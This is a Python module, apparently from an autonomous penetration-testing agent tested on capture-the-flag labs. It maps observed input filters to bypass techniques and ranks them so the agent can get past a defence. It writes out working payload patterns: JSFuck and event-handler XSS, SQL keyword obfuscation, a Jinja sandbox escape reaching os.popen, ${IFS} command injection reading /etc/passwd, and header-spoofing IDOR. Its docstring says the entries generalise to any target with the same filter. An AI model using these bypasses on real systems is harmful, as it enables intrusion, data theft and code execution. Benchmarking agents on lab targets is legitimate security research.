"""Defense-signature → second-order technique index (class-keyed, never lab-keyed).

A weak model reliably MAPS a defence (alphanumerics blocked, UNION filtered,
complete tags stripped) but then fails the *second-order* leap to the bypass —
that gap was the dominant cause of the unsolved XBEN labs. This index closes it:
given the attack class the agent is stuck in, it hands over a compact
``defence → technique → exact tool`` decision table, and (direction, not depth)
flags the rows whose technique already appears in the agent's recent activity so
the escalation steers it to a DIFFERENT one.

Every entry is keyed to the defence CLASS, so it generalises to any target with
the same filter — not the one lab it came from. Where a deterministic generator
exists (the transform() web-bypass tools), the entry names the exact call so the
model invokes the tool instead of hand-emitting a payload it gets wrong.
"""
from __future__ import annotations

from dataclasses import dataclass


@dataclass(frozen=True)
class Technique:
    id: str
    cls: str                       # injection class: xss | sqli | ssti | cmdi | idor
    defense: str                   # the mapped defence, in plain words
    technique: str                 # the second-order bypass
    tool: str = ""                 # exact deterministic tool call, when one exists
    signals: tuple[str, ...] = ()  # substrings that indicate this defence was OBSERVED
    tried_markers: tuple[str, ...] = ()  # substrings that indicate it was ALREADY tried


# Ordered within each class most-common-first. tried_markers are deliberately
# specific (a payload fragment unique to the technique) so "already tried" means
# the agent really emitted it, not merely mentioned the word.
INDEX: list[Technique] = [
    # ── XSS ──────────────────────────────────────────────────────────────────
    Technique(
        "xss_alnum_blocked", "xss",
        "every alphanumeric character is filtered in the injection context",
        "JSFuck — run arbitrary JS using only the six characters []()!+",
        "transform(action='webgen', options={kind:'jsfuck'}, text='alert(1)')",
        signals=("alphanumeric", "alnum", "letters are blocked", "letters filtered",
                 "no letters", "only symbols", "symbols only", "a-z0-9", "[a-za-z0-9]"),
        tried_markers=("jsfuck", "![]", "[][(![]", "fromcharcode("),
    ),
    Technique(
        "xss_complete_tag_stripped", "xss",
        "a filter strips only COMPLETE <...> tags (regex like <[^>]+>)",
        "leave the tag UNCLOSED — omit the final '>' so the stripper's pattern never matches",
        "transform(action='webgen', options={kind:'xss_filter', context:'html'}, text='alert(1)')",
        signals=("tags are stripped", "tag stripped", "strips tags", "removes tags",
                 "tag removed", "<[^>]", "complete tag", "tag filter", "sanitiz"),
        tried_markers=("onload=", "onerror=", "<svg onload", "//>"),
    ),
    Technique(
        "xss_script_tag_blocked", "xss",
        "the <script> tag (or its name) is blocked",
        "use a non-script element with an event handler: <svg onload=…> / <img src=x onerror=…>",
        "transform(action='webgen', options={kind:'xss_filter', context:'html'}, text='alert(1)')",
        signals=("script tag", "<script> blocked", "script blocked", "script removed"),
        tried_markers=("<svg", "onerror", "onload", "<img"),
    ),
    Technique(
        "xss_attribute_context", "xss",
        "the injection lands INSIDE an HTML attribute value",
        "break out of the attribute first: \"><svg onload=…>  (close the quote + the tag)",
        "transform(action='webgen', options={kind:'xss_filter', context:'attribute'}, text='alert(1)')",
        signals=("inside an attribute", "attribute value", "value=\"", "reflected in attribute",
                 "attribute context"),
        tried_markers=('"><', "'><"),
    ),
    Technique(
        "xss_quotes_stripped", "xss",
        "quotes are stripped/encoded so you can't write a string literal",
        "build the string without quotes: String.fromCharCode(...) or a template `literal`",
        "transform(action='encode', options={transforms:['js_fromcharcode']}, text='alert(1)')",
        signals=("quotes are", "quote stripped", "quotes stripped", "quote encoded",
                 "quotes encoded", "no quotes"),
        tried_markers=("fromcharcode", "`", "string.fromcharcode"),
    ),
    # ── SQLi ─────────────────────────────────────────────────────────────────
    Technique(
        "sqli_union_filtered", "sqli",
        "UNION / SELECT (or another keyword) is blocked or stripped",
        "obfuscate the keyword: inline comment UN/**/ION, case uNiOn, double-keyword "
        "UNIONUNION (survives a single strip), or /*!50000UNION*/",
        "transform(action='webgen', options={kind:'sql_keyword'}, text=\"' UNION SELECT ...\")",
        signals=("union is blocked", "union blocked", "union filtered", "select blocked",
                 "keyword blocked", "keyword filtered", "keyword stripped", "waf", "forbidden"),
        tried_markers=("/**/", "un/**/ion", "/*!", "unionunion", "uniunionon"),
    ),
    Technique(
        "sqli_space_filtered", "sqli",
        "whitespace is filtered so you can't separate tokens",
        "replace spaces with /**/, %0a, %09, %0c, or wrap sub-expressions in parentheses",
        "transform(action='webgen', options={kind:'sql_keyword'}, text=\"' OR 1=1-- -\")",
        signals=("space is", "spaces are", "whitespace", "space filtered", "no spaces"),
        tried_markers=("/**/", "%0a", "%09", "()"),
    ),
    Technique(
        "sqli_quotes_filtered", "sqli",
        "single/double quotes are filtered",
        "avoid quotes: use CHAR(0x61,...) / 0x61646d696e hex literals / numeric context, "
        "or concat without quotes",
        "transform(action='webgen', options={kind:'sql_keyword'}, text='...')",
        signals=("quote", "quotes filtered", "quotes blocked", "no quotes"),
        tried_markers=("char(", "0x", "concat("),
    ),
    # ── SSTI ─────────────────────────────────────────────────────────────────
    Technique(
        "ssti_braces_filtered", "ssti",
        "{{ }} expression delimiters are blocked",
        "use the statement delimiter {% ... %} (set + print), or the engine's alt syntax "
        "(${...}, #{...}), or attribute access request[...] to reach globals",
        "",
        signals=("{{ }}", "{{}} blocked", "braces blocked", "braces filtered",
                 "curly", "expression delimiter"),
        tried_markers=("{%", "${", "#{", "request["),
    ),
    Technique(
        "ssti_sandbox", "ssti",
        "Jinja sandbox blocks __class__/__globals__ attribute access",
        "reach os via a non-dunder gadget: {{cycler.__init__.__globals__.os.popen(...)}} "
        "or |attr('\\x5f\\x5fclass\\x5f\\x5f') to defeat the attribute denylist",
        "",
        signals=("sandbox", "sandboxed", "__class__ blocked", "attribute blocked", "restricted"),
        tried_markers=("cycler", "|attr(", "__globals__", "lipsum"),
    ),
    # ── Command injection ────────────────────────────────────────────────────
    Technique(
        "cmdi_space_filtered", "cmdi",
        "spaces are filtered in the command context",
        "use ${IFS} (or ${IFS%??}) / a literal tab / brace-expansion {cat,/etc/passwd}",
        "",
        signals=("space", "spaces are", "whitespace filtered", "no spaces"),
        tried_markers=("${ifs}", "{cat,", "%09"),
    ),
    Technique(
        "cmdi_keyword_filtered", "cmdi",
        "a command name / keyword is filtered",
        "break the token: concatenation c''at / wa\\t / wildcards /???/??t, or $(rev) it",
        "",
        signals=("command blocked", "keyword filtered", "blacklist", "denylist"),
        tried_markers=("''", "\\", "/???/", "$(rev"),
    ),
    # ── IDOR / authorization ─────────────────────────────────────────────────
    Technique(
        "idor_list_no_flag", "idor",
        "the list/collection endpoint returns objects but not the sensitive field",
        "hit the SINGULAR getter per id (/item/<id>) and SWEEP the id space — the field a "
        "list omits is often present on the single-object view",
        "report(action='coverage', data={type:'id_sweep', url:'<getter url with {}>', baseline:<known id>})",
        signals=("list endpoint", "collection", "returns a list", "no flag in", "field missing",
                 "not in the list", "enumerate"),
        tried_markers=("/receipt", "sweep", "/item/", "id="),
    ),
    Technique(
        "idor_header_authz", "idor",
        "authorization is decided by a request header you control (X-User-Id, X-Role, …)",
        "replay the privileged header as the VICTIM: set X-User-Id:<victim> (or X-Role:admin) "
        "on a data endpoint and read their object",
        "",
        signals=("x-user", "x-role", "x-userid", "header controls", "trusts the header",
                 "authorization header", "role header"),
        tried_markers=("x-user-id:", "x-role:", "x-userid:"),
    ),
]

_BY_CLASS: dict[str, list[Technique]] = {}
for _t in INDEX:
    _BY_CLASS.setdefault(_t.cls, []).append(_t)


def techniques_for_classes(classes) -> list[Technique]:
    """Every technique for the given attack classes, in index order."""
    out: list[Technique] = []
    for c in classes or []:
        out.extend(_BY_CLASS.get(str(c).lower(), []))
    return out


def _tried(t: Technique, blob: str) -> bool:
    return any(m in blob for m in t.tried_markers)


def match_observed(blob: str, classes=None) -> list[Technique]:
    """Techniques whose defence SIGNAL appears in ``blob`` (recent activity +
    findings, lowercased). Optionally restricted to ``classes``."""
    blob = (blob or "").lower()
    pool = techniques_for_classes(classes) if classes else list(INDEX)
    return [t for t in pool if any(s in blob for s in t.signals)]


def recommend(blob: str, classes=None, limit: int = 4) -> list[Technique]:
    """Ordered recommendations for a stuck agent. Rank key is (tried, not_observed):
      1. untried + defence-observed   — the precise next move
      2. untried + catalogue          — a different technique to change direction to
      3. tried + observed             — the thing it already did (shown last, flagged)
      4. tried + catalogue
    So a technique the agent has ALREADY tried never leads while an untried
    alternative exists — escalate on DIRECTION, not depth (#5)."""
    blob = (blob or "").lower()
    observed_ids = {t.id for t in match_observed(blob, classes)}
    pool = techniques_for_classes(classes) if classes else list(INDEX)
    seen, uniq = set(), []
    for t in pool:
        if t.id not in seen:
            seen.add(t.id)
            uniq.append(t)
    ranked = sorted(uniq, key=lambda t: (_tried(t, blob), t.id not in observed_ids))
    return ranked[:limit]


def render_decision_table(blob: str, classes, limit: int = 4) -> str:
    """Compact ``defence → technique → tool`` table for the stuck escalation.
    Rows whose technique already appears in ``blob`` are flagged so the model
    picks a DIFFERENT one. Returns '' when no class has an entry."""
    recs = recommend(blob, classes, limit=limit)
    # Always surface an OBSERVED technique even when it's been tried and thus
    # demoted out of the top rows — the model needs to see "you tried this; here
    # are alternatives", not have the matched defence vanish from the table.
    for t in match_observed(blob, classes):
        if t not in recs:
            recs.append(t)
    if not recs:
        return ""
    lblob = (blob or "").lower()
    lines = ["DEFENCE → TECHNIQUE decision table (pick a row you have NOT tried; "
             "the tool emits the payload so you don't hand-build it):"]
    for t in recs:
        tag = "  [already tried — pick another]" if _tried(t, lblob) else ""
        lines.append(f"• [{t.cls}] If {t.defense}:")
        lines.append(f"    → {t.technique}{tag}")
        if t.tool:
            lines.append(f"    → tool: {t.tool}")
    return "\n".join(lines)
